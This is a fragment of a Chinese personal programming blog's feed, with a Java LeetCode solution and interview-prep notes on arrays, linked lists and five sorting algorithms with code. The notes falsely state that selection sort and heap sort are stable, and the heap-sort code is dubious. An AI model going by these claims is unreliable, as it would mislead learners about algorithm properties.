class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        <span class="type">char</span> ch;</span><br><span class="line">        <span class="type">int</span> index;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">char</span> ch,<span class="type">int</span> index)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.ch = ch;</span><br><span class="line">            <span class="built_in">this</span>.index = index;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        LinkedList&lt;Node&gt; linkedList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Character,Node&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(ch,i);</span><br><span class="line">            <span class="comment">//如果该字符出现过</span></span><br><span class="line">            <span class="keyword">if</span> (hashMap.get(ch) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (linkedList.size() &gt; max) &#123;</span><br><span class="line">                    max = linkedList.size();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//删掉重复值及其之前的值</span></span><br><span class="line">                <span class="keyword">while</span> (linkedList.getFirst().index&lt;hashMap.get(ch).index)&#123;</span><br><span class="line">                    hashMap.remove(linkedList.removeFirst().ch);</span><br><span class="line">                &#125;</span><br><span class="line">                hashMap.remove(linkedList.removeFirst().ch);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//将这个元素添加至链表和哈希表中</span></span><br><span class="line">            linkedList.addLast(node);</span><br><span class="line">            hashMap.put(ch,node);</span><br><span class="line">            <span class="keyword">if</span> (linkedList.size()&gt;max)&#123;</span><br><span class="line">                max = linkedList.size();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>做是做出来了，但是结果不太行，用时只超过了30%，之后再看看优化吧，但估计是不会再更新了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pre&quot;&gt;&lt;a href=&quot;#pre&quot; class=&quot;headerlink&quot; title=&quot;pre&quot;&gt;&lt;/a&gt;pre&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;这是我的第一个算法题记录，以后都会以这种形式记录下来
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;刷力扣其实是我很早之前就想做</summary>
      
    
    
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>知识梳理</title>
    <link href="http://example.com/2022/03/10/%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/"/>
    <id>http://example.com/2022/03/10/%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</id>
    <published>2022-03-10T08:50:22.000Z</published>
    <updated>2022-09-08T15:08:37.284Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="pre"><a href="#pre" class="headerlink" title="pre"></a>pre</h1><p>这次知识梳理是为了应对面试的，但是我想的话这之后也有很大的用处，可以检测一下自己的知识面，所以应该会经常更新，我说的是应该。。。</p><p>可能内容的排版会有出入，等之后内容很多了我再调整</p><hr><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h2 id="数组和链表"><a href="#数组和链表" class="headerlink" title="数组和链表"></a>数组和链表</h2><p>数组查询时比较快，插入和删除比较慢<br>链表查询时比较慢，插入删除比较快<br> <strong>原因:</strong><br>  数组的存储空间是连在一起的方便查询，删除或插入很可能会影响操作点之后的所有数<br>  链表的存储空间是分散的，查询的时候必须从第一个开始，一个一个往下查，所以很慢，删除和插入只用找到那个点位进行操作就ok，不会影响点位之后的数</p><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p>遍历n次数组，如果当前数比后一个数大则将当前<br>数与后一个数交换位置，每遍历一次可排好一个数<br>的位置，直到n次，时间复杂度为O（N2），排序满足稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] bubbleSort(<span class="type">int</span>[] ints)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; ints.length-i; j++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[j];</span><br><span class="line">                <span class="keyword">if</span> (ints[j]&lt;ints[j-<span class="number">1</span>])&#123;</span><br><span class="line">                    ints[j] = ints[j-<span class="number">1</span>];</span><br><span class="line">                    ints[j-<span class="number">1</span>] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ints;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">2</span>,<span class="number">5</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">BubbleSort</span>().bubbleSort(ints);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>遍历数组，每一次遍历都会从当前位置之后寻找最小的数，并记录最小数的位置，然后将当前值和最小值交换，完整遍历后可以得到一个顺序列表，时间复杂度为O（N2），排序满足稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SelectionSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] selectionSort(<span class="type">int</span>[] ints)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">first</span> <span class="operator">=</span> ints[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> first;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i+<span class="number">1</span>; j &lt; ints.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ints[j]&lt;tmp)&#123;</span><br><span class="line">                    tmp = ints[j];</span><br><span class="line">                    index = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ints[i] = ints[index];</span><br><span class="line">            ints[index] = first;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ints;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">7</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">SelectionSort</span>().selectionSort(ints);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p>每次排序前先选择一个基准数，然后把比基准数小的放左边，比基准书大的放右边，具体方法是用两个指针，一个从左到右，一个从右到左，左指针找到比基准数大的数时，将左指针的数和右指针的数交换，然后右指针开始向左找比基准书小的数，找到后和左指针的数交换，直到两个指针相遇，此时数组被分成两个区域，再对这两个区域进行快排递归，直到所有数都排好为止<br>时间复杂度为O(nlogn),在最坏的情况下为O(N2),且不能保证稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuickSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] quickSort(<span class="type">int</span>[] ints,<span class="type">int</span> left,<span class="type">int</span> right)&#123;</span><br><span class="line">        <span class="keyword">if</span> (left&lt;right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">baseNum</span> <span class="operator">=</span> ints[left];</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> left;</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> right;</span><br><span class="line">            <span class="keyword">while</span> (l&lt;r)&#123;</span><br><span class="line">                <span class="keyword">while</span> (ints[r]&gt;=baseNum&amp;&amp;l&lt;r)&#123;</span><br><span class="line">                    r--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (l&lt;r)&#123;</span><br><span class="line">                    ints[l] = ints[r];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> (ints[l]&lt;=baseNum&amp;&amp;l&lt;r)&#123;</span><br><span class="line">                    l++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (l&lt;r)&#123;</span><br><span class="line">                    ints[r] = ints[l];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ints[l] = baseNum;</span><br><span class="line">            quickSort(ints,left, r-<span class="number">1</span>);</span><br><span class="line">            quickSort(ints,l+<span class="number">1</span>,right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ints;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">2</span>,<span class="number">5</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">QuickSort</span>().quickSort(ints,<span class="number">0</span>,ints.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>分治的思想，先将整个数组一分为二，再二分为四……直到分成一个部分只有一个元素为止，这是分的思想。将分出来的部分合并为一个有序的部分，两个已经排好序的部分合并就比较容易了，每一次只需要比较头元素的大小，然后选择小的那个加入到中间数组里即可，用递归的方法可以很好的实现这个思想<br>时间复杂度稳定为O(nlogn),并且能保证稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MergeSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] ints,<span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] tmp = <span class="keyword">new</span> <span class="title class_">int</span>[ints.length];</span><br><span class="line">        <span class="keyword">if</span> (left&lt;right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">            sort(ints,left,mid);</span><br><span class="line">            sort(ints,mid+<span class="number">1</span>,right);</span><br><span class="line">            merge(ints,left,mid,right,tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] ints,<span class="type">int</span> left,<span class="type">int</span> mid,<span class="type">int</span> right,<span class="type">int</span>[] tmp)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> left;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> mid+<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l&lt;=mid||r&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">if</span> (l&gt;mid)&#123;</span><br><span class="line">                tmp[index++] = ints[r++];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (r&gt;right)&#123;</span><br><span class="line">                tmp[index++] = ints[l++];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ints[l]&lt;ints[r])&#123;</span><br><span class="line">                tmp[index++] = ints[l++];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp[index++] = ints[r++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; i &lt;= right; i++) &#123;</span><br><span class="line">            ints[i] = tmp[index++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">7</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MergeSort</span>().sort(ints,<span class="number">0</span>,ints.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p>将数据重新排列成一个最小堆，即每个结点的父节点都小于其子结点，这样顶部的元素一定是当前堆的最小值，将顶部元素取出并将叶子结点放置到顶部元素，这样操作后可能会破坏最小堆的结构，所以此时需要重新生成最小堆，这样又可以得出这个堆的最小值，这样重复操作，直到所有数都被取出<br>时间复杂度稳定为O(nlogn),并且保证稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeapSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">heapSort</span><span class="params">(<span class="type">int</span>[] ints)</span>&#123;</span><br><span class="line">        <span class="comment">//形成最小堆</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> ints.length-<span class="number">1</span>; i &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">            <span class="comment">//只有一个子结点且为左子结点</span></span><br><span class="line">            <span class="keyword">if</span> (i%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">father</span> <span class="operator">=</span> i/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span> (ints[father]&gt;ints[i])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[father];</span><br><span class="line">                    ints[father] = ints[i];</span><br><span class="line">                    ints[i] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">father</span> <span class="operator">=</span> (i-<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">small</span> <span class="operator">=</span> ints[i]&lt;ints[i-<span class="number">1</span>]?ints[i]:ints[i-<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">smallIndex</span> <span class="operator">=</span> ints[i]&lt;ints[i-<span class="number">1</span>]?i:i-<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (small&lt;ints[father])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[father];</span><br><span class="line">                    ints[father] = ints[smallIndex];</span><br><span class="line">                    ints[smallIndex] = tmp;</span><br><span class="line">                    arrange(ints,smallIndex, ints.length);</span><br><span class="line">                &#125;</span><br><span class="line">                i-=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//开始排序</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">lastIndex</span> <span class="operator">=</span> ints.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[lastIndex];</span><br><span class="line">            ints[lastIndex--] = ints[<span class="number">0</span>];</span><br><span class="line">            ints[<span class="number">0</span>] = tmp;</span><br><span class="line">            arrange(ints,<span class="number">0</span>,lastIndex+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">arrange</span><span class="params">(<span class="type">int</span>[] ints,<span class="type">int</span> index,<span class="type">int</span> intsLength)</span>&#123;</span><br><span class="line">        <span class="type">int</span> leftChildIndex;</span><br><span class="line">        <span class="type">int</span> rightChildIndex;</span><br><span class="line">        <span class="comment">//判断有无左子节点</span></span><br><span class="line">        <span class="keyword">if</span> (index*<span class="number">2</span>+<span class="number">1</span>&lt;intsLength)&#123;</span><br><span class="line">            leftChildIndex = index*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//有两个结点的情况</span></span><br><span class="line">            <span class="keyword">if</span> ((index+<span class="number">1</span>)*<span class="number">2</span>&lt;intsLength)&#123;</span><br><span class="line">                rightChildIndex = (index+<span class="number">1</span>)*<span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">small</span> <span class="operator">=</span> ints[leftChildIndex]&lt;ints[rightChildIndex]?ints[leftChildIndex]:ints[rightChildIndex];</span><br><span class="line">                <span class="type">int</span> <span class="variable">smallIndex</span> <span class="operator">=</span> ints[leftChildIndex]&lt;ints[rightChildIndex]?leftChildIndex:rightChildIndex;</span><br><span class="line">                <span class="keyword">if</span> (small&lt;ints[index])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[index];</span><br><span class="line">                    ints[index] = ints[smallIndex];</span><br><span class="line">                    ints[smallIndex] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                arrange(ints,smallIndex,intsLength);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//只有一个子节点的情况</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ints[leftChildIndex]&lt;ints[index])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[index];</span><br><span class="line">                    ints[index] = ints[leftChildIndex];</span><br><span class="line">                    ints[leftChildIndex] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">HeapSort</span>().heapSort(ints);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title="???"></a>???</h3><p>还有其他排序后续加入</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;pre&quot;&gt;&lt;a href=&quot;#pre&quot; class=&quot;headerlink&quot; title=&quot;pre&quot;&gt;&lt;/a&gt;pre&lt;/h1&gt;&lt;p&gt;这次知识梳理是为了应对面试的，但是我想的话这之后也有很大的用处，可以检测一下自己的知识面，所以应该会经常更</summary>
      
    
    
    
    
    <category term="整理" scheme="http://example.com/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>终于开始了我的个人博客</title>
    <link href="http://example.com/2022/03/10/%E7%BB%88%E4%BA%8E%E5%BC%80%E5%A7%8B%E4%BA%86%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>http://example.com/2022/03/10/%E7%BB%88%E4%BA%8E%E5%BC%80%E5%A7%8B%E4%BA%86%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2022-03-10T08:05:01.000Z</published>
    <updated>2022-03-10T13:59:46.000Z</updated>
    
